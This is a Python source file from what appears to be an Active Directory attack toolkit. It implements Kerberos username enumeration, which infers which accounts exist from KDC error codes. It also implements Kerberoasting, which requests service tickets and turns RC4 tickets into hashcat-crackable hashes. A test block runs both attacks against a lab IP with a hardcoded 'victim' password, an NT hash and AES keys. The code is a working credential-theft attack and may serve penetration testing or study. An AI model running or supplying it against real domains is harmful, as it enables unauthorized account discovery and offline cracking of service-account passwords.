from .communication import *
from .common import TGSTicket2hashcat


class KerberosEtypeTest:
	# TODO: implement this
	pass

class KerberosUserEnum:
	def __init__(self, ksoc):
		self.ksoc = ksoc

	def construct_tgt_req(realm, username):
		now = datetime.datetime.utcnow()
		kdc_req_body = {}
		kdc_req_body['kdc-options'] = KDCOptions(set(['forwardable','renewable','proxiable']))
		kdc_req_body['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [username]})
		kdc_req_body['realm'] = realm.upper()
		kdc_req_body['sname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': ['krbtgt', realm.upper()]})
		kdc_req_body['till'] = now + datetime.timedelta(days=1)
		kdc_req_body['rtime'] = now + datetime.timedelta(days=1)
		kdc_req_body['nonce'] = secrets.randbits(31)
		kdc_req_body['etype'] = [2, 3, 16, 23, 17, 18] #we "support" all MS related enctypes
		
		pa_data_1 = {}
		pa_data_1['padata-type'] = int(PADATA_TYPE('PA-PAC-REQUEST'))
		pa_data_1['padata-value'] = PA_PAC_REQUEST({'include-pac': True}).dump()
		
		kdc_req = {}
		kdc_req['pvno'] = krb5_pvno
		kdc_req['msg-type'] = MESSAGE_TYPE.KRB_AS_REQ.value
		kdc_req['padata'] = [pa_data_1]
		kdc_req['req-body'] = KDC_REQ_BODY(kdc_req_body)
		
		return AS_REQ(kdc_req)

	def run(self, realm, users):
		"""
		Requests a TGT in the name of the users specified in users. 
		Returns a list of usernames that are in the domain.

		realm: kerberos realm (domain name of the corp)
		users: list : list of usernames to test
		"""
		existing_users = []
		for user in users:
			logging.debug('Probing user %s' % user)
			req = KerberosUserEnum.construct_tgt_req(realm, user)
			rep = self.ksoc.sendrecv(req.dump(), throw = False)
					
			if rep.name != 'KRB_ERROR':	
				# user doesnt need preauth, but it exists
				existing_users.append(user)
			
			elif rep.native['error-code'] != KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED.value:
				# any other error means user doesnt exist
				continue
			
			else:
				# preauth needed, only if user exists
				existing_users.append(user)

		return existing_users



class Kerberoast:
	def __init__(self, ccred, ksoc, kcomm = None):
		self.ccred = ccred
		self.ksoc = ksoc
		self.kcomm = kcomm

	def run(self, targets, allhash = False):
		"""
		Requests TGS tickets for all service users specified in the targets list
		targets: list : the SPN users to request the TGS tickets for
		allhash: bool : Return all enctype tickets, ot just 23
		"""
		if not self.kcomm:
			self.kcomm = KerbrosComm(self.ccred, self.ksoc)
			self.kcomm.get_TGT()
		tgss = []
		for target in targets:
			tgs, encTGSRepPart, key = self.kcomm.get_TGS(target, override_etype = [2, 3, 16, 23, 17, 18])
			tgss.append(tgs)
		
		results = []
		for tgs in tgss:
			if int(tgs['ticket']['enc-part']['etype']) == 23 or allhash:
				results.append(TGSTicket2hashcat(tgs))


		return results

if __name__ == '__main__':
	logging.basicConfig(level=logging.DEBUG)
	
	ccred = User()
	ccred.username = 'victim'
	ccred.domain = 'TEST.corp'
	ccred.password = 'Almaalmaalma!1'
	ccred.NT = 'df85f802490f0384233c895f06ba2011'
	ccred.kerberos_key_aes_256 = 'd3f3593c9debec0be8db57b160f6b0f0c82fb4c0e5dcaa1e1e26ceddcfd05f60'
	ccred.kerberos_key_aes_128 = 'fa021d1bf218a731bad4c19b5bcaae8c'
	
	target = TargetUser()
	target.username = 'FileServer'
	target.service = None
	target.domain = 'TEST.corp' #the kerberos realm
	
	ksoc = KerberosSocket('192.168.9.1')

	kr = Kerberoast(ccred, ksoc)
	kr.run([target])

	#### user enum test
	users = ['blabla', 'victim', 'Administrator']
	realm = 'TEST.corp'

	kue = KerberosUserEnum(ksoc)
	u = kue.run(realm, users)
	print(u)